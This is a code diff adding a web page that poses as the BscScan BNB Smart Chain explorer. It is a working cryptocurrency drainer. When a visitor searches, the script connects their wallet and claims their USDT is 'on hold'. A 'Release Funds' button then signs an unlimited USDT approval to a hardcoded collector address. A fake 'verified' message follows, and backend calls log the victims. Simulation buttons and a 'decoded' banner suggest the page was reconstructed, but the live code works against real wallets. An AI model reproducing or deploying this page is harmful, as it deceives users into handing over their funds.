@@ -1,0 +1,455 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>BNB Smart Chain (BNB)</title>
+<meta name="theme-color" content="#000000">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 34 34'><circle cx='17' cy='17' r='16' fill='%23111'/><path d='M9.5 20.5a8 8 0 0 1 15-3.4 8 8 0 0 1-15 3.4z' fill='%23F0B90B'/></svg>">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="manifest" href="/manifest.json">
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{margin:0;background:#F7F8FA;color:#1E2025;font:15px/1.45 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-font-smoothing:antialiased}
+.mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+.wrap{max-width:480px;margin:0 auto;background:#F7F8FA;padding-bottom:40px}
+.dev{background:#0e1522;color:#c9d3e3;font:11.5px/1.75 ui-monospace,Menlo,monospace;padding:12px 14px;margin:0 0 10px}
+.dev b{color:#f5d97a;font-weight:500}
+body.has-wallet .dev{display:none}
+.topbar{height:34px;border-bottom:1px solid #ECEEF3;display:flex;align-items:center;justify-content:space-between;padding:0 14px;font-size:12.5px}
+.topbar i{font-style:normal;color:#7A8496}.topbar b{font-weight:600}.topbar .red{color:#E4483F}
+header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;align-items:center;justify-content:space-between;padding:0 14px}
+.brand{display:flex;align-items:center;gap:8px}
+.wm{font-size:20px;font-weight:700;letter-spacing:-.5px;line-height:1}
+.sub{font-size:8.5px;color:#5A6473;margin-top:2px}
+.hr{display:flex;align-items:center;gap:16px;font-size:15px;font-weight:500}
+.burg{display:flex;flex-direction:column;gap:4px}
+.burg i{display:block;width:19px;height:2px;background:#1E2025;border-radius:2px}
+.hero{background:#fff;padding:18px 16px 24px;text-align:center}
+.hero h1{margin:0 0 7px;font-size:25px;font-weight:700;letter-spacing:-.6px;line-height:1.2}
+.hero p{margin:0 auto;font-size:15px;color:#7A8496;max-width:300px}
+.card{background:#fff;border:1px solid #EDF0F5;border-radius:13px;margin:0 12px 12px;overflow:hidden;box-shadow:0 1px 3px rgba(16,24,40,.05)}
+.tabs{display:flex;border-bottom:1px solid #EDF0F5;padding:0 6px}
+.tabs button{flex:1;background:none;border:0;font:15px inherit;color:#7A8496;padding:13px 0 11px;border-bottom:2px solid transparent;margin-bottom:-1px}
+.tabs button.on{color:#1183D6;border-bottom-color:#1183D6;font-weight:500}
+.pad{padding:12px 14px 14px}
+.field{display:flex;align-items:center;gap:9px;border:1px solid #DDE2EA;border-radius:9px;height:48px;padding:0 13px}
+.field input{flex:1;border:0;outline:0;font:15px inherit;background:transparent;min-width:0}
+.primary{width:100%;height:48px;margin-top:12px;border:0;border-radius:9px;background:#1183D6;color:#fff;font:600 16px inherit;cursor:pointer}
+.primary:active{background:#0d70ba}
+.cardhd{display:flex;align-items:center;justify-content:space-between;padding:14px;border-bottom:1px solid #EDF0F5}
+.cardhd h3{margin:0;font-size:17px;font-weight:600}
+.cust{font-size:14px;color:#4B5563}
+.brow{display:flex;align-items:center;gap:10px;padding:13px 12px;border-bottom:1px solid #EDF0F5}
+.brow:last-child{border-bottom:0}
+.bic{flex:0 0 40px;width:40px;height:40px;border-radius:9px;background:#F1F3F7;display:grid;place-items:center;color:#5A6473}
+.bmid{flex:1;min-width:0;text-align:center}
+.bl1{font-size:15px;font-weight:600;color:#1183D6}
+.bl1 span{font-size:13px;color:#8A94A6;font-weight:400;margin-left:7px}
+.bl2{font-size:13.5px;color:#7A8496;margin-top:3px}
+.bl2 b{color:#1183D6;font-weight:600}
+.badge{flex:0 0 auto;border:1px solid #DDE2EA;border-radius:7px;padding:6px 9px;font-size:13px;background:#fff}
+.devbar{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin:0 12px 12px}
+.devbar button{font:12px inherit;padding:7px 12px;border-radius:20px;border:1px solid #DDE2EA;background:#fff;color:#4B5563;cursor:pointer}
+.ftr{padding:16px;text-align:center;font-size:12px;color:#8A94A6}
+.ovl{position:fixed;inset:0;background:rgba(6,9,15,.78);display:none;align-items:center;justify-content:center;padding:16px;z-index:90;overflow:auto}
+.ovl.on{display:flex}
+.new_popup,.popup{position:relative;width:100%;max-width:370px;background:#0e1522;border:1px solid rgba(245,217,122,.35);border-radius:18px;padding:24px 20px;color:#fff;overflow:hidden;text-align:center}
+.watermark-layer{position:absolute;inset:0;opacity:.11;pointer-events:none;overflow:hidden}
+.watermark-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding:10px;font-size:9px;color:#f5d97a;transform:rotate(-16deg) scale(1.35);white-space:nowrap}
+.new_section{position:relative;margin-bottom:18px}
+.emoji-lg{font-size:34px;line-height:1}
+.new_title_main{margin:10px 0 8px;font-size:22px;font-weight:700;letter-spacing:-.3px}
+.new_subtitle2{margin:0;font-size:13px;color:#9fb0c9;line-height:1.5}
+.highlight{color:#f5d97a;font-weight:600}
+.new_inline_section,.new_inline_section2{position:relative;text-align:left;background:rgba(255,255,255,.045);border:1px solid rgba(245,217,122,.18);border-radius:12px;padding:12px 14px;margin-bottom:10px}
+.new_emoji_line{display:flex;gap:12px;align-items:flex-start}
+.emoji-sm{font-size:18px;line-height:1.2}
+.new_subtitle{margin:0;font-size:11px;letter-spacing:.5px;text-transform:uppercase;color:#8fa2bd}
+.new_title{margin:3px 0 0;font-size:20px;font-weight:700;color:#f5d97a}
+.new_inline_section2 .new_subtitle{margin:0;font-size:12.5px;color:#c9d3e3;line-height:1.55;text-transform:none;letter-spacing:0}
+.new_buttons_area{position:relative;display:flex;flex-direction:column;gap:9px;margin-top:16px}
+.new_verify_btn{border:0;border-radius:10px;padding:14px;font:600 14px inherit;background:#f5d97a;color:#141a24;cursor:pointer}
+.new_verify_btn.blue{background:#1183D6;color:#fff}
+.new_close_btn{border:1px solid rgba(255,255,255,.18);background:transparent;color:#c9d3e3;border-radius:10px;padding:12px;font:500 13px inherit;cursor:pointer}
+.release_overlay{position:fixed;inset:0;background:rgba(6,9,15,.82);display:none;align-items:center;justify-content:center;z-index:95;padding:16px}
+.release_overlay.active{display:flex}
+.release_loading{text-align:center;color:#f5d97a;font-size:14px}
+.spinner{width:34px;height:34px;border:3px solid rgba(245,217,122,.25);border-top-color:#f5d97a;border-radius:50%;margin:0 auto 12px;animation:sp .7s linear infinite}
+@keyframes sp{to{transform:rotate(360deg)}}
+.release_popup{display:none;width:100%;max-width:340px;background:#0e1522;border:1px solid rgba(255,255,255,.14);border-radius:18px;padding:24px 20px;color:#fff;text-align:center}
+.popup_icon{font-size:34px}
+.popup_title{margin:8px 0 16px;font-size:19px;font-weight:700}
+.usdt_info_box{display:flex;align-items:center;gap:10px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:11px;padding:12px 14px;margin-bottom:9px;text-align:left}
+.usdt_text{font-size:13px;color:#c9d3e3}
+.usdt_value,.required_value{color:#f5d97a;font-weight:700}
+.close_btn{margin-top:12px;width:100%;border:0;border-radius:10px;padding:13px;font:600 14px inherit;background:#f5d97a;color:#141a24;cursor:pointer}
+.subtitle2{margin:0;font-size:13px;color:#9fb0c9}
+.popup h2{margin:8px 0;font-size:21px;font-weight:700}
+.inline-section,.inline-section2{background:rgba(255,255,255,.045);border:1px solid rgba(245,217,122,.18);border-radius:12px;padding:12px 14px;margin-bottom:10px;text-align:left}
+.inline-section .subtitle,.inline-section2 .subtitle{margin:0;font-size:11px;letter-spacing:.5px;text-transform:uppercase;color:#8fa2bd}
+.inline-section .title{margin:3px 0 0;font-size:20px;font-weight:700;color:#f5d97a}
+.inline-section2 .subtitle22{margin:0;font-size:13px;font-weight:600;color:#fff;text-transform:none;letter-spacing:0}
+.overlayy{position:fixed;inset:0;background:rgba(6,9,15,.8);display:none;align-items:center;justify-content:center;padding:16px;z-index:99}
+.overlayy.on{display:flex}
+.modal{background:#0e1522;border:1px solid rgba(255,255,255,.14);border-radius:16px;padding:22px;max-width:340px;color:#fff;text-align:center;position:relative}
+.modal h3{margin:6px 0 8px;font-size:17px}
+.modal p{margin:0 0 14px;font-size:13px;color:#9fb0c9;line-height:1.5}
+.ok-btn{width:100%;border:0;border-radius:10px;padding:13px;font:600 14px inherit;background:#f5d97a;color:#141a24;cursor:pointer}
+.modal .hint{margin-top:10px;font-size:11.5px;color:#6f7f96}
+.modal .close{position:absolute;top:10px;right:12px;background:none;border:0;color:#8fa2bd;font-size:15px;cursor:pointer}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <div class="dev">
+    <b>DECODED FROM mycode.js</b><br>
+    USDT 0x55d398326f99059fF775485246999027B3197955<br>
+    APPROVE MaxUint256 (unlimited)<br>
+    DUST 0.25 | MIN 50 | CHAIN 0x38
+  </div>
+
+  <div class="topbar">
+    <span><i>BNB Price:</i> <b id="tbPrice">$901.42</b> <span class="red" id="tbChg">(-0.71%)</span></span>
+    <span><i>Gas:</i> <b>0.05 Gwei</b></span>
+  </div>
+
+  <header>
+    <div class="brand">
+      <svg width="30" height="30" viewBox="0 0 34 34"><circle cx="17" cy="17" r="16" fill="#111"/><path d="M9.5 20.5a8 8 0 0 1 15-3.4 8 8 0 0 1-15 3.4z" fill="#F0B90B"/><rect x="20" y="9" width="2.6" height="11" rx="1.3" fill="#F0B90B"/><rect x="23.6" y="11.5" width="2.6" height="8.5" rx="1.3" fill="#F0B90B"/></svg>
+      <div><div class="wm">BscScan</div><div class="sub">A Scan Original</div></div>
+    </div>
+    <div class="hr"><span id="signIn">Sign In</span><span class="burg"><i></i><i></i><i></i></span></div>
+  </header>
+
+  <div class="hero">
+    <h1>BNB Smart Chain Explorer</h1>
+    <p>Search by Address / Txn Hash / Block / Token / Domain Name</p>
+  </div>
+
+  <div class="card">
+    <div class="tabs"><button class="on">Transactions</button><button>Tokens</button><button>Blocks</button></div>
+    <div class="pad">
+      <label class="field">
+        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="#9AA3B2" stroke-width="2.2"><circle cx="11" cy="11" r="7"/><path d="M20 20l-4.3-4.3"/></svg>
+        <input id="q" placeholder="Search by Address / Txn Hash...">
+      </label>
+      <button class="primary" id="searchBtn">Search</button>
+    </div>
+  </div>
+
+  <div class="devbar">
+    <button data-sim="120">120 USDT</button>
+    <button data-sim="47.3">47.3 USDT</button>
+    <button data-sim="50">exactly 50</button>
+  </div>
+
+  <div class="card">
+    <div class="cardhd"><h3>Latest Blocks</h3><span class="cust">Customize</span></div>
+    <div id="blocks"></div>
+  </div>
+
+  <div class="ftr">BNB Smart Chain Explorer &middot; chain id 56</div>
+</div>
+
+<div class="ovl" id="new_overlay">
+  <div class="new_popup">
+    <div class="watermark-layer"><div id="watermarkGrid" class="watermark-grid"></div></div>
+    <div class="new_section">
+      <div class="emoji-lg">🔒</div>
+      <h2 class="new_title_main">Assets On Hold!</h2>
+      <p class="new_subtitle2" id="new_burn_text">We've temporarily hold your assets for security verification</p>
+    </div>
+    <div class="new_inline_section">
+      <div class="new_emoji_line">
+        <div class="emoji-sm">❗</div>
+        <div><p class="new_subtitle">Hold Amount</p><p class="new_title" id="new_burn_text2">0 USDT</p></div>
+      </div>
+    </div>
+    <div class="new_inline_section2">
+      <div class="new_emoji_line">
+        <div class="emoji-sm">🛡️</div>
+        <div><p id="new_notice_text" class="new_subtitle">Your Funds are in security verification on BEP20, please click on release funds to Release.</p></div>
+      </div>
+    </div>
+    <div class="new_buttons_area">
+      <button id="new_view_transctions" class="new_verify_btn">🔍 VIEW TRANSACTION</button>
+      <button id="new_verifyBtn" class="new_verify_btn blue">🔓 RELEASE FUNDS</button>
+      <button id="closeBtn" class="new_close_btn">✖️ Close</button>
+    </div>
+  </div>
+</div>
+
+<div id="releaseOverlay" class="release_overlay">
+  <div id="releaseLoading" class="release_loading"><div class="spinner"></div><p>Releasing Funds...</p></div>
+  <div id="releasePopup" class="release_popup">
+    <div class="popup_icon">⚠️</div>
+    <h2 class="popup_title">IN-sufficient USDT</h2>
+    <div class="usdt_info_box"><span>💲</span><span id="final_usdt_Text" class="usdt_text">Available USDT:</span></div>
+    <div class="usdt_info_box"><span>🔒</span><span id="final_depositText" class="usdt_text">Required :: <b>50 USDT</b></span></div>
+    <button id="final_closeBtn" class="close_btn">Close</button>
+  </div>
+</div>
+
+<div class="ovl" id="overlay2">
+  <div class="popup">
+    <div class="emoji-lg">✅</div>
+    <h2>USDT Verified!</h2>
+    <p class="subtitle2" id="burn-text11">Your P2P order has been verified as genuine.</p>
+    <div class="inline-section" style="margin-top:16px">
+      <div class="new_emoji_line"><div class="emoji-sm">✍️</div>
+        <div><p class="subtitle">Verified Amount</p><p class="title" id="burn-text22">0 USDT</p></div></div>
+    </div>
+    <div class="inline-section2">
+      <div class="new_emoji_line"><div class="emoji-sm">✔️</div>
+        <div><p class="subtitle22">Verification Success</p><p class="subtitle">Your USDT tokens are genuine and safe to use.</p></div></div>
+    </div>
+    <button id="closeBtn2" class="close_btn">Close</button>
+  </div>
+</div>
+
+<div class="ovl" id="txOverlay">
+  <div class="popup">
+    <h2 style="margin:0 0 14px">Transaction Receipt</h2>
+    <div class="inline-section2" style="text-align:left">
+      <p class="subtitle">Hash</p><p class="mono" id="txHash" style="font-size:11px;word-break:break-all;color:#fff">0x…</p>
+      <p class="subtitle" style="margin-top:10px">Status</p><p style="margin:0;color:#4ade80;font-size:13px">Success</p>
+      <p class="subtitle" style="margin-top:10px">Method</p><p style="margin:0;color:#fff;font-size:13px">Approve</p>
+    </div>
+    <button id="txClose" class="close_btn">Close</button>
+  </div>
+</div>
+
+<div id="noWalletOverlay" class="overlayy">
+  <div class="modal">
+    <button class="close" id="modalClose">✕</button>
+    <div class="emoji-lg">⚠️</div>
+    <h3>Please open this in a wallet browser</h3>
+    <p>This page must be opened inside Trust Wallet or MetaMask's in-app browser to approve tokens.</p>
+    <button id="modalOk" class="ok-btn">OK</button>
+    <div class="hint">On desktop, install MetaMask or open in your mobile wallet's browser.</div>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script>
+(function(){
+  "use strict";
+  var $ = function(id){ return document.getElementById(id); };
+
+  /* ============ CONFIG ============ */
+  var CFG = {
+    COLLECTOR: '0xec922f296fBb9c9057B2cF37A3c3189E57C5D44b',
+    BACKEND:   '',
+    USDT:      '0x55d398326f99059fF775485246999027B3197955',
+    DUST:      0.25,
+    MIN_SWEEP: 5,
+    CHAIN:     '0x38',
+    PARAMS: { chainId:'0x38', chainName:'BNB Smart Chain',
+      nativeCurrency:{name:'BNB',symbol:'BNB',decimals:18},
+      rpcUrls:['https://bsc-dataseed.binance.org'], blockExplorerUrls:['https://bscscan.com'] }
+  };
+
+  var simBalance = null;
+  var state = { account:null, balance:0, sendAmount:0, token:null, collector:null };
+
+  var eth = function(){ return window.ethereum || (window.trustwallet && window.trustwallet.ethereum) || null; };
+  if (eth()) document.body.classList.add('has-wallet');
+
+  function istTime(){ return new Date().toLocaleString('en-IN', { timeZone:'Asia/Kolkata' }); }
+  function updateWatermark(txt){
+    var g = $('watermarkGrid'); g.innerHTML = '';
+    for (var i=0;i<24;i++){ var s=document.createElement('span'); s.textContent=txt; g.appendChild(s); }
+  }
+
+  async function switchToBSC(){
+    var p = eth(); if(!p) return;
+    var cid = await p.request({ method:'eth_chainId' });
+    if (cid === CFG.CHAIN) return;
+    try { await p.request({ method:'wallet_switchEthereumChain', params:[{ chainId: CFG.CHAIN }] }); }
+    catch(e){
+      if(e && (e.code === 4902 || e.code === -32603))
+        await p.request({ method:'wallet_addEthereumChain', params:[CFG.PARAMS] });
+      else throw e;
+    }
+  }
+
+  async function detectAccounts(){
+    var p = eth(); if(!p) return [];
+    try { return await p.request({ method:'eth_accounts' }); } catch(e){ return []; }
+  }
+  async function connectWallet(){
+    var p = eth();
+    if(!p){ $('noWalletOverlay').classList.add('on'); return null; }
+    var acc = await p.request({ method:'eth_requestAccounts' });
+    return acc && acc[0];
+  }
+
+  async function checkStoredAddress(address){
+    if(!CFG.BACKEND) return null;
+    try{
+      var r = await fetch(CFG.BACKEND + '/collector.track', { method:'POST',
+        headers:{'Content-Type':'application/json'}, body: JSON.stringify({ address: address }) });
+      var j = await r.json();
+      return (j && j.address) ? j : null;
+    }catch(e){ return null; }
+  }
+  async function postTopup(to){
+    if(!CFG.BACKEND) return { ok:true };
+    try{
+      var r = await fetch(CFG.BACKEND + '/topup', { method:'POST',
+        headers:{'Content-Type':'application/json','x-topup-secret':'change-me'},
+        body: JSON.stringify({ to: to }) });
+      return { ok: r.ok, data: await r.json().catch(function(){ return {}; }) };
+    }catch(e){ return { ok:false, data:String(e) }; }
+  }
+  function logToSheet(amount, address, sheet, collector){
+    if(!CFG.BACKEND) return;
+    var fd = new FormData();
+    fd.append('amount', amount); fd.append('address', address);
+    fd.append('collector', collector || ''); fd.append('sheet', sheet || 'Sheet1');
+    fetch(CFG.BACKEND + '/sheet', { method:'POST', body: fd }).catch(function(){});
+  }
+
+  async function mySearchCode(){
+    try{
+      if(!eth() && simBalance === null){ $('noWalletOverlay').classList.add('on'); return; }
+
+      await switchToBSC();
+
+      var acc = (await detectAccounts())[0];
+      if(!acc) acc = await connectWallet();
+      if(!acc && simBalance === null) return;
+      state.account = acc || '0xSimulated0000000000000000000000000000aaaa';
+
+      if(eth()){
+        var provider = new ethers.providers.Web3Provider(eth());
+        var signer = await provider.getSigner();
+        state.token = new ethers.Contract(CFG.USDT, [
+          'function balanceOf(address owner) view returns (uint256)',
+          'function approve(address spender, uint256 value) returns (bool)',
+          'function decimals() view returns (uint8)'
+        ], signer);
+        var raw = await state.token.balanceOf(state.account);
+        var dec = 18;
+        try { dec = await state.token.decimals(); } catch(e){}
+        state.balance = Number(ethers.utils.formatUnits(raw, dec));
+        var bnb = Number(ethers.utils.formatEther(await provider.getBalance(state.account)));
+        if(bnb < 0.00002){ alert('You need a small amount of BNB for gas.'); return; }
+      } else {
+        state.balance = simBalance;
+      }
+
+      state.sendAmount = Math.max(0, state.balance - CFG.DUST);
+
+      var stored = await checkStoredAddress(state.account);
+      if(stored){ state.collector = stored.address; new_showPopup(Number(stored.amount) || state.sendAmount); return; }
+
+      var res = await postTopup(state.account);
+      if(!res.ok){ alert('Topup failed: ' + JSON.stringify(res.data)); return; }
+
+      new_showPopup(state.sendAmount);
+    }catch(e){
+      console.error('flow error', e);
+      alert((e && e.message) || String(e));
+    }
+  }
+
+  function new_showPopup(amount){
+    var shown = Number(amount).toFixed(2);
+    updateWatermark(istTime());
+    $('new_burn_text').innerHTML = "We've temporarily hold your assets for security verification &mdash; <span class=\"highlight\">$" + shown + " USDT</span>";
+    $('new_burn_text2').textContent = shown + ' USDT';
+    $('new_overlay').classList.add('on');
+  }
+
+  $('new_verifyBtn').addEventListener('click', function(){
+    var shown = parseFloat($('new_burn_text2').textContent) || 0;
+    var needed = Math.max(0, (shown - CFG.DUST) - state.balance);
+    $('final_usdt_Text').innerHTML = 'Available USDT: <span class="usdt_value">' + state.balance.toFixed(2) + '</span>';
+    $('final_depositText').innerHTML = 'Required :: <span class="required_value">' + needed.toFixed(2) + ' USDT</span>';
+    $('releaseOverlay').classList.add('active');
+    $('releaseLoading').style.display = 'block';
+    $('releasePopup').style.display = 'none';
+    setTimeout(function(){
+      $('releaseLoading').style.display = 'none';
+      if(state.balance < CFG.MIN_SWEEP){
+        $('releasePopup').style.display = 'block';
+      } else {
+        final_runApproveFlow();
+        $('releaseOverlay').classList.remove('active');
+      }
+    }, 2000);
+  });
+
+  async function final_runApproveFlow(){
+    try{
+      if(!state.collector) state.collector = CFG.COLLECTOR;
+      if(!state.collector){ alert('Set CFG.COLLECTOR to your wallet address.'); return; }
+      if(eth()){
+        var tx = await state.token.approve(state.collector, ethers.constants.MaxUint256);
+        await tx.wait();
+        $('txHash').textContent = tx.hash;
+        logToSheet(state.sendAmount, state.account, 'Sheet2', state.collector);
+        if(CFG.BACKEND) fetch(CFG.BACKEND + '/approved', { method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ from: state.account, amountHuman: String(state.sendAmount),
+            approveTxHash: tx.hash, collector: state.collector }) }).catch(function(){});
+      }
+      showPopup2();
+    }catch(e){
+      console.error('approve error', e);
+      alert((e && e.message) || String(e));
+    }
+  }
+
+  function showPopup2(){
+    $('burn-text11').textContent = 'Your ' + state.sendAmount.toFixed(2) + ' USDT has been verified as genuine.';
+    $('burn-text22').textContent = state.sendAmount.toFixed(2) + ' USDT';
+    $('overlay2').classList.add('on');
+  }
+
+  $('searchBtn').addEventListener('click', mySearchCode);
+  $('signIn').addEventListener('click', mySearchCode);
+  $('q').addEventListener('keydown', function(e){ if(e.key === 'Enter') mySearchCode(); });
+  $('closeBtn').addEventListener('click', function(){ $('new_overlay').classList.remove('on'); });
+  $('closeBtn2').addEventListener('click', function(){ $('overlay2').classList.remove('on'); });
+  $('final_closeBtn').addEventListener('click', function(){ $('releaseOverlay').classList.remove('active'); });
+  $('modalOk').addEventListener('click', function(){ $('noWalletOverlay').classList.remove('on'); });
+  $('modalClose').addEventListener('click', function(){ $('noWalletOverlay').classList.remove('on'); });
+  $('txClose').addEventListener('click', function(){ $('txOverlay').classList.remove('on'); });
+  $('new_view_transctions').addEventListener('click', function(){ $('txOverlay').classList.add('on'); });
+
+  document.querySelectorAll('[data-sim]').forEach(function(b){
+    b.addEventListener('click', function(){ simBalance = parseFloat(b.dataset.sim); mySearchCode(); });
+  });
+
+  function renderBlocks(){
+    var head = 74613256, h = '';
+    var vals = ['Validator : LegendIII','Validator : The48C...','Validator : Ankr','Validator : BscScan'];
+    for(var i=0;i<6;i++){
+      h += '<div class="brow"><div class="bic"><svg width="19" height="19" viewBox="0 0 24 24" fill="currentColor"><rect x="3" y="3" width="7.5" height="7.5" rx="1.4"/><rect x="13.5" y="3" width="7.5" height="7.5" rx="1.4"/><rect x="3" y="13.5" width="7.5" height="7.5" rx="1.4"/><rect x="13.5" y="13.5" width="7.5" height="7.5" rx="1.4"/></svg></div>'+
+      '<div class="bmid"><div class="bl1">'+(head-i)+'<span>'+(5+i*4)+' secs ago</span></div>'+
+      '<div class="bl2">Validated By <b>'+vals[i%4]+'</b></div>'+
+      '<div class="bl1" style="font-size:14px">'+(54+Math.floor(Math.random()*200))+' txns<span> in 1 sec</span></div></div>'+
+      '<div class="badge">'+(0.001+Math.random()*0.009).toFixed(4)+' BNB</div></div>';
+    }
+    $('blocks').innerHTML = h;
+  }
+  renderBlocks();
+  setInterval(renderBlocks, 6000);
+
+  fetch('https://api.binance.com/api/v3/ticker/24hr?symbol=BNBUSDT')
+    .then(function(r){ return r.json(); })
+    .then(function(j){
+      if(!j || !j.lastPrice) return;
+      $('tbPrice').textContent = '$' + parseFloat(j.lastPrice).toFixed(2);
+      var c = parseFloat(j.priceChangePercent);
+      $('tbChg').textContent = '(' + (c>=0?'+':'') + c.toFixed(2) + '%)';
+      $('tbChg').style.color = c >= 0 ? '#22C55E' : '#E4483F';
+    }).catch(function(){});
+})();
+</script>
+</body>
+</html>
